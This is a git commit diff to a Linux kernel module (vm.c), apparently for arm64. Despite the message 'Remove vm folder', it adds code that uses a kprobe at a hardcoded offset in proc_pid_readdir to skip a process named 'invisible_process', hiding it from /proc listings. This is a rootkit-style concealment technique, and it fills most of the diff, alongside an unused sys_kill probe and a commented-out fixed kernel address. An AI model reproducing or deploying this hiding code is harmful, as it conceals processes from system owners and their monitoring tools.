3861470f7dc573fba785f07b571863350ea2a9d1
EmbeddedOS <nguyenthanhcong12gtm1@gmail.com>
2025-11-23 11:11:47 +0700

    Remove vm folder

--- vm.c
+++ vm.c
@@ -3,9 +3,28 @@
 #include <linux/init.h>
 #include <linux/kprobes.h>
 #include <linux/sched.h>
+#include <linux/errno.h>
+
+#define PROCESS_NAME "invisible_process"
 
 #define __pr_info(fmt, ...) printk(KERN_INFO "[%s:%d] %s(): " fmt "\n", \
     __FILE__, __LINE__, __func__ , ##__VA_ARGS__)
+
+#define __pr_debug(fmt, ...) printk(KERN_DEBUG "[%s:%d] %s(): " fmt "\n", \
+    __FILE__, __LINE__, __func__ , ##__VA_ARGS__)
+
+
+pid_t find_pid_by_name(const char *process_name) {
+    struct task_struct *task = NULL;
+
+    for_each_process(task) {
+        if (strcmp(task->comm, process_name) == 0) {
+            return task->pid;
+        }
+    }
+
+    return -1;
+}
 
     int my_proc_pid_readdir(struct file *file, struct dir_context *ctx)
     {
@@ -33,50 +52,55 @@
         );
     }
 
+    struct tgid_iter {
+        unsigned int tgid;
+        struct task_struct *task;
+    };
+
 static int proc_pid_readdir_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
-    __pr_info("proc_pid_readdir_pre_handler");
-    regs->regs[19] = (unsigned long)p->addr + 4;
-    regs->pc = (unsigned long)hook_trampoline;
-    return 1;
+    pid_t proc_pid = regs->regs[3];
+    pid_t target_pid = find_pid_by_name(PROCESS_NAME);
+    __pr_info("proc_pid: %d, target_pid: %d", proc_pid, target_pid);
+    if (proc_pid == target_pid) {
+        __pr_info("Hiding %s: %d", PROCESS_NAME, proc_pid);
+        
+        regs->pc = (unsigned long)p->addr + 0xDC;
+        /*regs->pc = (unsigned long)0xffff8000805b0144;*/
+        return 1;
+    }
+    return 0;
+    // regs->regs[19] = (unsigned long)p->addr + 4;
+    // regs->pc = (unsigned long)hook_trampoline;
+    // return 1;
 }
 
-static int proc_pid_lookup_pre_handler(struct kprobe *p, struct pt_regs *regs)
-{
-    struct dentry *dentry = (struct dentry *)regs->regs[0];
-    __pr_info("Dentry name: %s", dentry->d_name.name);
-    if (dentry->d_parent) {
-        __pr_info("Parent: %s", dentry->d_parent->d_name.name);
-    }
 
+static int sys_kill_pre_handler(struct kprobe *p, struct pt_regs *regs)
+{
+    __pr_info("sys_kill_pre_handler");
     return 0;
 }
 
-static struct {
-    struct kprobe kp;
-} kprobe_handlers[] = {
-//    { .kp = { .symbol_name = "proc_pid_lookup", .pre_handler = proc_pid_lookup_pre_handler }, },
-    { .kp = { .symbol_name = "proc_pid_readdir", .pre_handler = proc_pid_readdir_pre_handler }, },
-};
+static struct kprobe kp1 = { .symbol_name = "proc_pid_readdir",
+    .offset = 0x134,
+    .pre_handler = proc_pid_readdir_pre_handler };
 
-static void unregister_kprobe_handlers(void)
-{
-    for (int i = 0; i < ARRAY_SIZE(kprobe_handlers); i++) {
-         unregister_kprobe(&kprobe_handlers[i].kp);
-    }
-}
+static struct kprobe kp2 = { .symbol_name = "sys_kill",
+    .offset = 0x00,
+    .pre_handler = sys_kill_pre_handler };
+
+static struct kprobe* kprobe_handlers[] = {
+    &kp1, 
+};
 
 static int __init vm_init(void)
 {
     int ret;
-
-    for (int i = 0; i < ARRAY_SIZE(kprobe_handlers); i++) {
-        ret = register_kprobe(&kprobe_handlers[i].kp);
-        if (ret < 0) {
-            __pr_info("Failed to register kprobe %s: %d", kprobe_handlers[i].kp.symbol_name, ret);
-            unregister_kprobe_handlers();
-            return ret;
-        }
+    ret = register_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
+    if (ret < 0) {
+        __pr_info("Failed to register kprobes %d", ret);
+        return ret;
     }
 
     return 0;
@@ -84,7 +108,7 @@ static int __init vm_init(void)
 
 static void __exit vm_exit(void)
 {
-    unregister_kprobe_handlers();
+    unregister_kprobes(kprobe_handlers, ARRAY_SIZE(kprobe_handlers));
 }
 
 module_init(vm_init);
